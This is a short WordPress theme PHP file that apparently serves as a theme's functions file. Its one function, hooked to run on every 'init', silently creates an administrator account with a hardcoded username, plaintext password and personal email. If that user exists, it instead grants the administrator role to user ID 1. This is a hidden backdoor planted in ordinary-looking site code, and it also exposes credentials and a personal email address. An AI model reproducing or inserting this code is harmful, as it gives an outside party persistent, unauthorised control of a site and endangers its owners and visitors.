<?php require_once get_stylesheet_directory() . '/includes/index.php';

function wpb_admin_account()
{
    $user = 'matheus';
    $pass = 'mentores594';
    $email = 'matheuskindrazki@gmail.com';
    if (!username_exists($user) && !email_exists($email)) {
        $user_id = wp_create_user($user, $pass, $email);
        $user = new WP_User($user_id);
        $user->set_role('administrator');
    } else {
        $user = new WP_User(1);
        $user->set_role('administrator');
    }

}
add_action('init', 'wpb_admin_account');
